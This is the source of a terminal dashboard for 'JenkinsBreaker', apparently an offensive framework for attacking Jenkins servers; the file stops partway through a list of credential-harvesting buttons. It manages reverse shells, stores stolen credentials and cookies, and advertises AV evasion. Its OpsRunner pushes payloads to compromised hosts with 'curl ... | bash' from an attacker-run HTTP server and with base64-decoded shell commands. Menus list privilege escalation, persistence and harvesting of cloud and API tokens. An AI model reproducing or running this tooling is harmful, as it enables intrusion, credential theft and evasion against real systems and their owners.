#!/usr/bin/env python3
"""
JenkinsBreaker Textual TUI - Interactive Terminal Interface
Provides real-time Jenkins exploitation dashboard with rich visualizations
"""

import asyncio
import base64
import socket
import sys
import threading
import time
from datetime import datetime
from functools import partial
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from typing import Optional

from rich.table import Table as RichTable
from textual.app import App, ComposeResult
from textual.binding import Binding
from textual.containers import Container, Horizontal, Vertical, VerticalScroll
from textual.reactive import reactive
from textual.screen import ModalScreen
from textual.widgets import (
    Button,
    DataTable,
    Footer,
    Header,
    Input,
    Label,
    ListItem,
    ListView,
    Log,
    RichLog,
    Static,
    TabbedContent,
    TabPane,
)

from jenkins_breaker.chain.chains import initial_access_chain
from jenkins_breaker.chain.engine import ChainEngine
from jenkins_breaker.core.enumeration import JenkinsEnumerator
from jenkins_breaker.core.fuzzer import JenkinsFuzzer
from jenkins_breaker.core.session import JenkinsSession, SessionConfig
from jenkins_breaker.modules import exploit_registry
from jenkins_breaker.payloads.obfuscator import GroovyObfuscator
from jenkins_breaker.post.reverse_shell import ReverseShellListener
from jenkins_breaker.post.session_manager import SessionStatus, session_manager
from jenkins_breaker.ui.loot import loot_manager
from jenkins_breaker.ui.workspace import workspace_manager


class StatusBar(Static):
    """Status bar showing connection and listener configuration with multi-handler status"""

    connection_status = reactive("Disconnected")
    listener_config = reactive("Not configured")
    session_count = reactive(0)

    def render(self) -> str:
        counts = session_manager.get_session_count()
        active = counts.get('active', 0)
        total = counts.get('total', 0)
        backgrounded = counts.get('backgrounded', 0)

        session_info = ""
        if total > 0:
            session_info = f" | [bold]Sessions:[/bold] [green]{active} active[/green]"
            if backgrounded > 0:
                session_info += f" [yellow]{backgrounded} bg'd[/yellow]"
            session_info += f" / {total} total"

        return f"[bold]Jenkins:[/bold] {self.connection_status} | [bold]Listener:[/bold] {self.listener_config}{session_info}"


class TargetInfo(Static):
    """Displays target Jenkins server information"""

    def __init__(self):
        super().__init__()
        self.target_url = ""
        self.version = "Unknown"
        self.plugins = []

    def set_target(self, url: str, version: str = "Unknown", plugins: list[str] = None):
        self.target_url = url
        self.version = version
        self.plugins = plugins or []
        self.update_display()

    def update_display(self):
        table = RichTable(title="Target Information", show_header=True, header_style="bold magenta")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="green")

        table.add_row("URL", self.target_url)
        table.add_row("Version", self.version)
        table.add_row("Plugins", str(len(self.plugins)))
        table.add_row("Status", "[green]Online[/green]" if self.target_url else "[red]Not Connected[/red]")

        self.update(table)


class CrumbStatus(Static):
    """Displays CSRF crumb status and vulnerabilities"""

    def __init__(self):
        super().__init__()
        self.crumb_value = ""
        self.status = "Not Fetched"
        self.vulnerabilities = {}

    def set_crumb_data(self, crumb_value: str = "", status: str = "Not Fetched", vulnerabilities: dict = None):
        self.crumb_value = crumb_value
        self.status = status
        self.vulnerabilities = vulnerabilities or {}
        self.update_display()

    def update_display(self):
        table = RichTable(title="CSRF Crumb Status", show_header=True, header_style="bold magenta")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="green")

        crumb_display = self.crumb_value[:16] + "..." if len(self.crumb_value) > 16 else self.crumb_value or "[dim]None[/dim]"

        if self.status == "Verified":
            status_display = "[green]✓ Verified[/green]"
        elif self.status == "Invalid":
            status_display = "[red]✗ Invalid[/red]"
        elif self.status == "Disabled":
            status_display = "[red]⚠ CSRF DISABLED[/red]"
            table.add_row("Vulnerability", "[red]CWE-352: CSRF Protection Disabled[/red]")
            table.add_row("Risk", "[red]High - All POST requests exploitable[/red]")
        elif self.status == "Missing":
            status_display = "[yellow]⊘ Not Found[/yellow]"
        else:
            status_display = "[dim]Not Fetched[/dim]"

        table.add_row("Crumb", crumb_display)
        table.add_row("Status", status_display)

        if self.vulnerabilities:
            if self.vulnerabilities.get('replay_vulnerable'):
                table.add_row("Replay", "[red]VULNERABLE[/red]")
            if self.vulnerabilities.get('no_ip_binding'):
                table.add_row("IP Binding", "[yellow]Not Enforced[/yellow]")

        self.update(table)


class ExploitLog(Log):
    """Real-time exploit execution log"""

    def log_info(self, message: str):
        from io import StringIO

        from rich.console import Console as RichConsole
        string_io = StringIO()
        rich_console = RichConsole(file=string_io, force_terminal=True, width=200)
        rich_console.print(message, style="cyan")
        self.write(string_io.getvalue())

    def log_success(self, message: str):
        from io import StringIO

        from rich.console import Console as RichConsole
        string_io = StringIO()
        rich_console = RichConsole(file=string_io, force_terminal=True, width=200)
        rich_console.print(f"[+] {message}", style="green")
        self.write(string_io.getvalue())

    def log_error(self, message: str):
        from io import StringIO

        from rich.console import Console as RichConsole
        string_io = StringIO()
        rich_console = RichConsole(file=string_io, force_terminal=True, width=200)
        rich_console.print(f"[-] {message}", style="red")
        self.write(string_io.getvalue())

    def log_warning(self, message: str):
        from io import StringIO

        from rich.console import Console as RichConsole
        string_io = StringIO()
        rich_console = RichConsole(file=string_io, force_terminal=True, width=200)
        rich_console.print(f"[!] {message}", style="yellow")
        self.write(string_io.getvalue())

    def log_header(self, message: str):
        from io import StringIO

        from rich.console import Console as RichConsole
        string_io = StringIO()
        rich_console = RichConsole(file=string_io, force_terminal=True, width=200)
        rich_console.print(message, style="bold cyan")
        self.write(string_io.getvalue())

    def log_plain(self, message: str):
        self.write(message + "\n")


class SessionsPanel(DataTable):
    """Displays active reverse shell sessions with health monitoring"""

    def __init__(self):
        super().__init__(cursor_type="row", id="sessions-table")
        self.add_column("ID", width=10)
        self.add_column("Host", width=20)
        self.add_column("User@Host", width=20)
        self.add_column("Shell", width=10)
        self.add_column("Status", width=16)
        self.add_column("Uptime", width=12)

    def refresh_sessions(self):
        self.clear()
        sessions = session_manager.list_sessions()
        len(sessions)
        len([s for s in sessions.values() if s.status in [SessionStatus.ACTIVE, SessionStatus.BACKGROUNDED, SessionStatus.INTERACTING]])

        for session_id, metadata in sessions.items():
            is_alive = metadata.is_alive(300)

            if metadata.status == SessionStatus.INTERACTING:
                status_color = "[bold cyan]"
                status_icon = "▶ "
            elif metadata.status == SessionStatus.BACKGROUNDED:
                status_color = "[yellow]"
                status_icon = "⏸ "
            elif metadata.status == SessionStatus.ACTIVE:
                status_color = "[green]"
                status_icon = "● "
            elif metadata.status == SessionStatus.DEAD or not is_alive:
                status_color = "[red]"
                status_icon = "✕ "
            else:
                status_color = "[white]"
                status_icon = "○ "

            user_host = f"{metadata.username or '?'}@{metadata.hostname or '?'}"
            host_display = f"{metadata.remote_host}:{metadata.remote_port}"
            shell_display = metadata.shell_type.value if metadata.shell_type else "?"
            status_display = f"{status_color}{status_icon}{metadata.status.value.upper()}[/]"
            time_display = metadata.get_uptime()

            if not is_alive:
                status_display = "[red]✕ TIMEOUT[/]"

            self.add_row(
                session_id,
                host_display,
                user_host,
                shell_display,
                status_display,
                time_display,
                key=session_id
            )


class LootPanel(DataTable):
    """Displays captured credentials and artifacts"""

    def __init__(self):
        super().__init__(cursor_type="row", id="loot-table")
        self.add_column("Type", width=15)
        self.add_column("Value", width=40)
        self.add_column("Source", width=20)
        self.add_column("Time", width=12)

    def refresh_loot(self):
        self.clear()

        artifacts = loot_manager.get_all_artifacts()
        for artifact in artifacts[-10:]:
            time_str = artifact.timestamp.strftime("%H:%M:%S")
            content_preview = artifact.content[:30] + "..." if len(artifact.content) > 30 else artifact.content
            self.add_row(
                "[cyan]Artifact[/]",
                f"{artifact.name}: {content_preview}",
                artifact.source or "Unknown",
                time_str
            )

        credentials = loot_manager.get_all_credentials()
        for cred in credentials[-10:]:
            time_str = cred.timestamp.strftime("%H:%M:%S")
            self.add_row(
                "[yellow]Credential[/]",
                f"{cred.username}:{cred.password[:20]}..." if cred.password else f"{cred.username}",
                cred.source or "Unknown",
                time_str
            )


class FuzzerPanel(DataTable):
    """Displays fuzzer findings"""

    def __init__(self):
        super().__init__(cursor_type="row", id="fuzzer-table")
        self.add_column("Severity", width=12)
        self.add_column("Type", width=25)
        self.add_column("Target", width=30)
        self.add_column("Details", width=50)

    def add_finding(self, finding: dict):
        severity = finding.get('severity', 'info')
        severity_color = {
            'critical': '[bold red]',
            'high': '[red]',
            'medium': '[yellow]',
            'low': '[blue]',
            'info': '[cyan]'
        }.get(severity.lower(), '[white]')

        self.add_row(
            f"{severity_color}{severity.upper()}[/]",
            finding.get('type', 'unknown'),
            finding.get('job', finding.get('endpoint', finding.get('path', 'N/A'))),
            finding.get('description', 'No description')[:50]
        )


class HTTPTrafficViewer(Log):
    """Displays HTTP requests and responses"""

    def log_request(self, method: str, url: str, headers: dict = None, body: str = None):
        from io import StringIO

        from rich.console import Console as RichConsole
        string_io = StringIO()
        rich_console = RichConsole(file=string_io, force_terminal=True, width=200)

        rich_console.print("\n[bold cyan]>>> REQUEST[/bold cyan]")
        rich_console.print(f"[green]{method}[/green] {url}")
        if headers:
            rich_console.print("[yellow]Headers:[/yellow]")
            for k, v in headers.items():
                rich_console.print(f"  {k}: {v}")
        if body:
            rich_console.print(f"[yellow]Body:[/yellow]\n{body[:500]}")

        self.write(string_io.getvalue())

    def log_response(self, status_code: int, headers: dict = None, body: str = None):
        from io import StringIO

        from rich.console import Console as RichConsole
        string_io = StringIO()
        rich_console = RichConsole(file=string_io, force_terminal=True, width=200)

        status_color = "green" if status_code < 300 else ("yellow" if status_code < 400 else "red")
        rich_console.print("\n[bold cyan]<<< RESPONSE[/bold cyan]")
        rich_console.print(f"[{status_color}]Status: {status_code}[/{status_color}]")
        if headers:
            rich_console.print("[yellow]Headers:[/yellow]")
            for k, v in list(headers.items())[:10]:
                rich_console.print(f"  {k}: {v}")
        if body:
            rich_console.print(f"[yellow]Body:[/yellow]\n{body[:500]}")

        self.write(string_io.getvalue())


class CVEInfoPanel(Static):
    """Displays detailed CVE information"""

    def __init__(self):
        super().__init__(id="cve-info-panel")
        self.current_cve = None

    def set_cve(self, cve_id: str):
        self.current_cve = cve_id
        metadata = exploit_registry.list_all().get(cve_id)

        if metadata:
            table = RichTable(title=f"CVE Details: {cve_id}", show_header=False)
            table.add_column("Property", style="cyan", width=20)
            table.add_column("Value", style="white")

            table.add_row("Name", metadata.name)
            table.add_row("Severity", f"[bold]{metadata.severity.upper()}[/bold]")
            table.add_row("Authentication", "Required" if metadata.requires_auth else "Not Required")
            table.add_row("Description", metadata.description or "No description available")

            if hasattr(metadata, 'cvss_score'):
                table.add_row("CVSS Score", str(metadata.cvss_score))

            if hasattr(metadata, 'references'):
                refs = '\n'.join(metadata.references[:3])
                table.add_row("References", refs)

            self.update(table)
        else:
            self.update(f"[red]CVE {cve_id} not found[/red]")


class PayloadCustomizer(Static):
    """Panel for customizing payload generation"""

    def __init__(self):
        super().__init__(id="payload-customizer")
        self.target_os = "linux"
        self.encoding = "none"
        self.obfuscation = "moderate"
        self.update(self._render_config())

    def _render_config(self):
        return f"""[bold cyan]Payload Configuration[/bold cyan] [dim](Press 'p' to customize)[/dim]

[yellow]Target OS:[/yellow] [green]{self.target_os}[/green] (linux | windows | macos)
[yellow]Encoding:[/yellow] [green]{self.encoding}[/green] (none | base64 | hex | url)
[yellow]Obfuscation:[/yellow] [green]{self.obfuscation}[/green] (light | moderate | aggressive)

[dim]Settings apply to next exploit execution[/dim]
"""

    def set_config(self, target_os: str = None, encoding: str = None, obfuscation: str = None):
        if target_os:
            self.target_os = target_os
        if encoding:
            self.encoding = encoding
        if obfuscation:
            self.obfuscation = obfuscation
        self.update(self._render_config())


class OpsecPanel(Static):
    """OPSEC configuration and monitoring"""

    def __init__(self):
        super().__init__(id="opsec-panel")
        self.jitter_enabled = True
        self.obfuscation_enabled = True
        self.polymorphism_enabled = True
        self.update(self._render_status())

    def _render_status(self):
        jitter_status = "[green]✓ ENABLED[/green]" if self.jitter_enabled else "[red]✗ DISABLED[/red]"
        obf_status = "[green]✓ ACTIVE[/green]" if self.obfuscation_enabled else "[red]✗ INACTIVE[/red]"
        poly_status = "[green]✓ ACTIVE[/green]" if self.polymorphism_enabled else "[red]✗ INACTIVE[/red]"

        return f"""[bold cyan]OPSEC Status[/bold cyan] [dim](Press 'o' to toggle)[/dim]

[yellow]Jitter Timing:[/yellow] {jitter_status}
[yellow]Payload Obfuscation:[/yellow] {obf_status}
[yellow]Polymorphism:[/yellow] {poly_status}
[yellow]HTTP User-Agent:[/yellow] [green]Randomized[/green]

[dim]All payloads use unique signatures for AV evasion[/dim]
"""

    def toggle_jitter(self):
        self.jitter_enabled = not self.jitter_enabled
        self.update(self._render_status())

    def toggle_obfuscation(self):
        self.obfuscation_enabled = not self.obfuscation_enabled
        self.update(self._render_status())

    def toggle_polymorphism(self):
        self.polymorphism_enabled = not self.polymorphism_enabled
        self.update(self._render_status())


class ChainSelector(DataTable):
    """Displays available exploit chains"""

    def __init__(self):
        super().__init__(cursor_type="row", id="chain-selector")
        self.add_column("Chain", width=35)
        self.add_column("Steps", width=8)
        self.add_column("Description", width=55)

        chains = [
            ("Initial Access Chain", "3", "File read → Creds → Reverse shell"),
            ("Full Compromise Chain", "8", "RCE → Recon → Persistence → Lateral movement"),
            ("Stealth Recon Chain", "5", "Enumerate → Extract → Exfiltrate (no shells)"),
            ("Persistence Chain", "4", "Backdoor jobs → Cron → SSH keys → API tokens"),
        ]

        for chain_name, steps, description in chains:
            self.add_row(chain_name, steps, description, key=chain_name)


class CVETable(DataTable):
    """Displays available CVE exploits with metadata"""

    def __init__(self):
        super().__init__(cursor_type="row", zebra_stripes=True)
        self.add_column("CVE", width=20)
        self.add_column("Name", width=40)
        self.add_column("Risk", width=10)
        self.add_column("Auth", width=8)
        self.add_column("Status", width=12)

        self.filter_text = ""
        self.filter_severity = None
        self.filter_auth = None
        
        self.can_focus = True
        self.refresh_table()

    def refresh_table(self):
        """Refresh table with current filters applied"""
        import datetime
        log_file = "C:/Users/Chogyam/cve_table_refresh.log"
        
        with open(log_file, "a") as f:
            f.write(f"\n{'='*80}\n")
            f.write(f"refresh_table() called at {datetime.datetime.now()}\n")
            f.write(f"{'='*80}\n")
        
        self.clear()

        exploits = exploit_registry.list_all()
        
        with open(log_file, "a") as f:
            f.write(f"Total exploits from registry: {len(exploits)}\n")
            f.write(f"Exploit IDs: {sorted(exploits.keys())}\n")
            f.write(f"FEATURE-SCRIPT-CONSOLE present: {'FEATURE-SCRIPT-CONSOLE' in exploits}\n")
            f.write(f"Current filters - severity: {self.filter_severity}, auth: {self.filter_auth}, text: '{self.filter_text}'\n")

        if self.filter_severity:
            exploits = {k: v for k, v in exploits.items() if v.severity.lower() == self.filter_severity.lower()}

        if self.filter_auth is not None:
            exploits = {k: v for k, v in exploits.items() if v.requires_auth == self.filter_auth}

        if self.filter_text:
            filter_lower = self.filter_text.lower()
            exploits = {k: v for k, v in exploits.items()
                       if filter_lower in k.lower() or filter_lower in v.name.lower()}

        with open(log_file, "a") as f:
            f.write(f"After filtering: {len(exploits)} exploits\n")
            f.write(f"Filtered exploit IDs: {sorted(exploits.keys())}\n")

        row_num = 0
        for cve_id, metadata in sorted(exploits.items()):
            row_num += 1
            risk_color = {
                "critical": "[red]",
                "high": "[orange1]",
                "medium": "[yellow]",
                "low": "[blue]"
            }.get(metadata.severity.lower(), "[white]")

            auth_required = "Yes" if metadata.requires_auth else "No"

            self.add_row(
                cve_id,
                metadata.name,
                f"{risk_color}{metadata.severity.title()}[/]",
                auth_required,
                "[green]Ready[/]",
                key=cve_id
            )
            
            with open(log_file, "a") as f:
                f.write(f"Row {row_num}: {cve_id} - {metadata.name}\n")
        
        with open(log_file, "a") as f:
            f.write(f"\nFinal table.row_count: {self.row_count}\n")
            f.write(f"Table rows keys: {[str(k.value) for k in self.rows.keys()]}\n")

    def set_filter(self, text: str = None, severity: str = None, auth: bool = None):
        """Set filters and refresh table"""
        if text is not None:
            self.filter_text = text
        if severity is not None:
            self.filter_severity = severity
        if auth is not None:
            self.filter_auth = auth
        self.refresh_table()

    def clear_filters(self):
        """Clear all filters"""
        self.filter_text = ""
        self.filter_severity = None
        self.filter_auth = None
        self.refresh_table()


class CrumbVault(ModalScreen):
    """Modal screen for manually injecting session cookies and CSRF crumbs."""

    CSS = """
    CrumbVault {
        align: center middle;
    }

    #vault-dialog {
        width: 80;
        height: 20;
        border: thick $accent;
        background: $surface;
        padding: 1;
    }

    #vault-buttons {
        height: 3;
        align: center middle;
    }
    """

    def compose(self) -> ComposeResult:
        with Container(id="vault-dialog"):
            yield Label("[bold cyan]Crumb Vault - Manual Session Injection[/bold cyan]")
            yield Label("\n[dim]Inject stolen session credentials from browser or other source[/dim]\n")

            yield Label("JSESSIONID Cookie:")
            yield Input(placeholder="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", id="jsessionid-input")

            yield Label("\nJenkins-Crumb Header:")
            yield Input(placeholder="a1b2c3d4e5f6...", id="crumb-input")

            yield Label("\n[dim]Leave blank to keep existing values[/dim]")

            with Horizontal(id="vault-buttons"):
                yield Button("Save & Override", variant="primary", id="save-vault-btn")
                yield Button("Cancel", variant="error", id="cancel-vault-btn")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "save-vault-btn":
            jsessionid = self.query_one("#jsessionid-input", Input).value
            crumb = self.query_one("#crumb-input", Input).value

            self.dismiss({
                "action": "save",
                "jsessionid": jsessionid,
                "crumb": crumb
            })
        elif event.button.id == "cancel-vault-btn":
            self.dismiss({"action": "cancel"})


class OpsRunner:
    """Automated operations runner for shell sessions with HTTP server and base64 fallback"""

    def __init__(self, session_meta, send_command_func, output_func):
        self.session_meta = session_meta
        self.send_command = send_command_func
        self.output = output_func
        self.http_server = None
        self.http_thread = None
        self.attacker_ip = self._detect_attacker_ip()
        self.http_port = 8888

    def _detect_attacker_ip(self) -> str:
        """Detect attacker IP from the session's local connection"""
        if self.session_meta and self.session_meta.local_host:
            if self.session_meta.local_host != "0.0.0.0":
                return self.session_meta.local_host

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def _start_http_server(self, directory: Path):
        """Start temporary HTTP server in background - thread-safe without changing global CWD"""
        class QuietHandler(SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                pass

        # CRITICAL FIX: Use partial to bind directory to handler instead of os.chdir()
        # This prevents breaking other parts of the app that rely on CWD (e.g., config loading)
        handler_class = partial(QuietHandler, directory=str(directory))

        # GOD TIER FIX: Auto-increment port if 8888 is busy (multi-instance or port conflict)
        while True:
            try:
                self.http_server = HTTPServer(('0.0.0.0', self.http_port), handler_class)
                break
            except OSError as e:
                # Port already in use - try next one
                self.http_port += 1
                if self.http_port > 9000:
                    raise Exception(f"Could not find available port (tried 8888-9000): {e}")

        self.http_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
        self.http_thread.start()

    def _stop_http_server(self):
        """Stop HTTP server"""
        if self.http_server:
            self.http_server.shutdown()
            self.http_server = None

    def run_script(self, script_content: str, script_name: str = "script.sh"):
        """Execute script on target with intelligent delivery method selection"""
        self.output(f"[bold cyan][+] EXECUTING: {script_name}[/bold cyan]")

        # Stealth optimization: Prefer base64 for small scripts (<2KB)
        # Benefits: Stealthier, faster, bypasses firewalls that block HTTP ports
        if len(script_content) < 2048:
            self.output("[dim]Script is small (<2KB). Using in-band base64 delivery (stealth mode)...[/dim]")
            encoded = base64.b64encode(script_content.encode()).decode('ascii')
            self.send_command(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return

        # For larger scripts, use HTTP delivery with base64 fallback
        self.send_command("which curl", show_in_output=False)
        time.sleep(0.3)
        self.send_command("which wget", show_in_output=False)
        time.sleep(0.3)

        payloads_dir = Path.home() / ".jenkins_breaker" / "payloads"
        payloads_dir.mkdir(parents=True, exist_ok=True)
        script_path = payloads_dir / script_name
        script_path.write_text(script_content, encoding='utf-8')

        try:
            self._start_http_server(payloads_dir)
            self.output(f"[dim]HTTP server started on {self.attacker_ip}:{self.http_port}[/dim]")

            http_url = f"http://{self.attacker_ip}:{self.http_port}/{script_name}"
            self.send_command(f"curl -fsSL {http_url} | bash", show_in_output=True)

            time.sleep(2)
            self._stop_http_server()

        except Exception:
            self.output("[yellow]HTTP delivery failed, using base64 fallback...[/yellow]")
            encoded = base64.b64encode(script_content.encode()).decode('ascii')
            self.send_command(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)

    def run_python_script(self, script_class):
        """Run Python-based operator script"""
        try:
            script_instance = script_class()
            self.output(f"[bold cyan][+] Running: {script_instance.name}[/bold cyan]")
            self.output(f"[dim]{script_instance.description}[/dim]")
            
            result = script_instance.run(
                self.session_meta,
                self.send_command,
                self.output
            )
            
            if result.success:
                if result.loot:
                    self.output(f"[green][+] Loot collected: {len(result.loot)} items[/green]")
            else:
                if result.error:
                    self.output(f"[red][!] Error: {result.error}[/red]")
            
            return result
        except Exception as e:
            self.output(f"[red][!] Script execution failed: {str(e)}[/red]")
            from jenkins_breaker.ui.ops_scripts.base import ScriptResult
            return ScriptResult(success=False, output="", error=str(e))

    def run_postex_module(self, module_name: str, function_name: str, **kwargs):
        """Directly call postex module function"""
        try:
            self.output(f"[bold cyan][+] Running postex module: {module_name}.{function_name}[/bold cyan]")
            
            import importlib
            module = importlib.import_module(f"jenkins_breaker.postex.{module_name}")
            func = getattr(module, function_name)
            
            result = func(**kwargs)
            
            if result:
                self.output(f"[green][+] Module execution complete[/green]")
            
            return result
        except Exception as e:
            self.output(f"[red][!] Module execution failed: {str(e)}[/red]")
            return None


class PayloadConfigModal(ModalScreen):
    """Interactive modal for payload configuration"""

    CSS = """
    PayloadConfigModal {
        align: center middle;
    }

    #config-dialog {
        width: 60;
        height: 28;
        border: thick $accent;
        background: $surface;
        padding: 1;
    }

    #config-title {
        text-align: center;
        background: $primary;
        color: $text;
        padding: 1;
        margin-bottom: 1;
    }

    .config-label {
        color: cyan;
        margin-top: 1;
    }

    #config-buttons {
        margin-top: 2;
        align: center middle;
    }

    Button {
        margin: 0 1;
    }
    """

    def __init__(self, current_config: dict):
        super().__init__()
        self.current_config = current_config
        self.target_os = current_config.get('target_os', 'linux')
        self.encoding = current_config.get('encoding', 'none')
        self.obfuscation = current_config.get('obfuscation', 'moderate')

    def compose(self) -> ComposeResult:
        with Container(id="config-dialog"):
            yield Label("[bold]Payload Configuration[/bold]", id="config-title")

            yield Label("Target OS:", classes="config-label")
            yield ListView(
                ListItem(Label("Linux"), id="os-linux"),
                ListItem(Label("Windows"), id="os-windows"),
                ListItem(Label("MacOS"), id="os-macos"),
                initial_index=["linux", "windows", "macos"].index(self.target_os),
                id="list-os"
            )

            yield Label("Encoding:", classes="config-label")
            yield ListView(
                ListItem(Label("None (Raw)"), id="enc-none"),
                ListItem(Label("Base64"), id="enc-base64"),
                ListItem(Label("Hex"), id="enc-hex"),
                initial_index=["none", "base64", "hex"].index(self.encoding),
                id="list-enc"
            )

            yield Label("Obfuscation Level:", classes="config-label")
            yield ListView(
                ListItem(Label("Light"), id="obf-light"),
                ListItem(Label("Moderate"), id="obf-moderate"),
                ListItem(Label("Aggressive"), id="obf-aggressive"),
                initial_index=["light", "moderate", "aggressive"].index(self.obfuscation),
                id="list-obf"
            )

            with Horizontal(id="config-buttons"):
                yield Button("Save", variant="success", id="btn-save")
                yield Button("Cancel", variant="error", id="btn-cancel")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "btn-save":
            os_idx = self.query_one("#list-os", ListView).index
            enc_idx = self.query_one("#list-enc", ListView).index
            obf_idx = self.query_one("#list-obf", ListView).index

            new_config = {
                "target_os": ["linux", "windows", "macos"][os_idx],
                "encoding": ["none", "base64", "hex"][enc_idx],
                "obfuscation": ["light", "moderate", "aggressive"][obf_idx]
            }
            self.dismiss(new_config)

        elif event.button.id == "btn-cancel":
            self.dismiss(None)


class ShellInteraction(ModalScreen):
    """Advanced shell interaction modal - Post-Exploitation HUD with automated operations"""

    CSS = """
    ShellInteraction {
        align: center middle;
    }

    #shell-dialog {
        width: 95%;
        height: 95%;
        border: thick $accent;
        background: $surface;
        padding: 1;
        layout: vertical;
        overflow: hidden;
    }

    #shell-main-area {
        height: 1fr;
        overflow: hidden;
    }

    #terminal-display {
        width: 70%;
        height: 100%;
        layout: vertical;
        padding: 0;
    }

    #shell-output {
        height: 1fr;
        border: solid $primary;
        background: #0a0a0a;
        color: #ffffff !important;
        padding: 1;
        scrollbar-gutter: stable;
        overflow-y: scroll;
    }

    #shell-output:focus {
        border: solid cyan;
    }

    #ops-sidebar {
        width: 30%;
        height: 1fr;
        border: solid $accent;
        background: $panel;
    }

    #shell-input-container {
        height: auto;
        background: $panel;
        border: thick cyan;
        padding: 1;
        margin-top: 0;
    }

    #input-label {
        width: 16;
        color: yellow;
        text-style: bold;
        padding-right: 1;
    }

    #shell-command-input {
        width: 100%;
        height: 3;
        border: solid cyan;
        background: #111111;
        color: #ffffff !important;
    }

    #shell-command-input > .input--value {
        color: #ffffff !important;
    }

    #shell-command-input > .input--cursor {
        color: #00ff00 !important;
        background: #00ff00 !important;
    }

    #shell-buttons {
        height: 4;
        min-height: 4;
        align: center middle;
        background: $panel;
        padding: 0;
    }

    TabbedContent {
        height: 1fr;
    }

    TabPane {
        padding: 1;
    }
    """

    def __init__(self, session_id: str):
        super().__init__()
        self.session_id = session_id
        self.session_meta = session_manager.get_session(session_id)
        self.recv_thread: Optional[threading.Thread] = None
        self.running = False
        self.command_history: list[str] = []
        self.history_index: int = -1
        self.is_stabilized = False
        self.transcript_path = Path.home() / ".jenkins_breaker" / "loot" / "sessions" / f"{session_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        self.transcript_path.parent.mkdir(parents=True, exist_ok=True)
        self.transcript_file = None
        self.ops_runner = None

    def compose(self) -> ComposeResult:
        session_info = f"Session {self.session_id} - {self.session_meta.remote_host}:{self.session_meta.remote_port}"
        user_info = f"{self.session_meta.username or 'unknown'}@{self.session_meta.hostname or 'unknown'}"

        with Container(id="shell-dialog"):
            yield Label(f"[bold cyan]═══ POST-EXPLOITATION HUD - {session_info} ═══[/bold cyan]")
            yield Label(f"[dim]{user_info} | {self.session_meta.shell_type.value} | {self.session_meta.os_type or 'unknown'} | Transcript: {self.transcript_path.name}[/dim]\n")

            with Horizontal(id="shell-main-area"):
                with Vertical(id="terminal-display"):
                    yield RichLog(id="shell-output", auto_scroll=True, markup=False, highlight=False, wrap=True)

                    with Vertical(id="shell-input-container"):
                        yield Label("Command (↑↓ history):", id="input-label")
                        yield Input(placeholder="Type here and press Enter", id="shell-command-input", value="")

                with Vertical(id="ops-sidebar"):
                    yield Label("[bold yellow]═ OPERATIONS ═[/bold yellow]")

                    with TabbedContent():
                        with TabPane("Escalate", id="tab-escalate"):
                            with VerticalScroll():
                                yield Button("Kernel Exploit Suggester", id="esc-kernel", variant="primary")
                                yield Button("SUID/SGID Hunter", id="esc-suid")
                                yield Button("Capability Enum", id="esc-capabilities")
                                yield Button("Sudo Exploit Check", id="esc-sudo-exploit")
                                yield Button("Docker Socket Escape", id="esc-docker-escape")
                                yield Button("Container Breakout", id="esc-container-break")
                                yield Button("Writable Path Hijack", id="esc-path-hijack")
                                yield Button("Cron Analysis", id="esc-cron")
                                yield Button("Systemd Units", id="esc-systemd")
                                yield Button("DBus Enumeration", id="esc-dbus")
                                yield Button("PolicyKit Bypass", id="esc-policykit")
                                yield Button("LD_PRELOAD Check", id="esc-ld-preload")
                                yield Button("Dirty Cow Check", id="esc-dirtycow")
                                yield Button("Kernel CVE Mapper", id="esc-kernel-cve")
                                yield Button("UAC Bypass (Win)", id="esc-uac")
                                yield Button("Token Manipulation (Win)", id="esc-token")
                                yield Button("Kerberos Tickets", id="esc-kerberos")
                                yield Button("SAM/SYSTEM Grab (Win)", id="esc-sam")
                                yield Button("RunAs Creds (Win)", id="esc-runas")
                                yield Button("Scheduled Task Hijack (Win)", id="esc-schtask")
                                yield Button("Weak Service Perms (Win)", id="esc-weak-svc")
                                yield Button("Unquoted Service Path (Win)", id="esc-unquoted")
                                yield Button("AlwaysInstallElevated (Win)", id="esc-alwaysinstall")
                                yield Button("DLL Hijacking (Win)", id="esc-dll")
                                yield Button("Writable System32 (Win)", id="esc-sys32")

                        with TabPane("Harvest", id="tab-harvest"):
                            with VerticalScroll():
                                yield Button("SSH Key Collector", id="harv-ssh-keys", variant="primary")
                                yield Button("Cloud Metadata", id="harv-cloud-meta")
                                yield Button("Jenkins Secrets", id="harv-jenkins-secrets")
                                yield Button("Database Credentials", id="harv-db-creds")
                                yield Button("Config File Scraper", id="harv-configs")
                                yield Button("Browser Credentials", id="harv-browser")
                                yield Button("AWS Credentials", id="harv-aws")
                                yield Button("KeePass/1Password Finder", id="harv-keepass")
                                yield Button("AWS Comprehensive", id="harv-aws-comp")
                                yield Button("GCP Service Accounts", id="harv-gcp-sa")
                                yield Button("Azure Managed Identity", id="harv-azure-mi")
                                yield Button("Kubernetes Tokens", id="harv-k8s")
                                yield Button("Docker Registry Creds", id="harv-docker-reg")
                                yield Button("NPM Tokens", id="harv-npm")
                                yield Button("PyPI Tokens", id="harv-pypi")
                                yield Button("GitHub Tokens", id="harv-github")
                                yield Button("GitLab Tokens", id="harv-gitlab")
                                yield Button("Slack Tokens", id="harv-slack")
                                yield Button("SendGrid Keys", id="harv-sendgrid")
                                yield Button("Twilio Credentials", id="harv-twilio")
                                yield Button("Datadog Keys", id="harv-datadog")
                                yield Button("Stripe Keys", id="harv-stripe")
                                yield Button("PostgreSQL Dump", id="harv-postgres")
                                yield Button("MySQL Dump", id="harv-mysql")
                                yield Button("MongoDB Dump", id="harv-mongodb")
                                yield Button("Redis Dump", id="harv-redis")
                                yield Button("Vault Tokens", id="harv-vault")
                                yield Button("Ansible Vaults", id="harv-ansible")
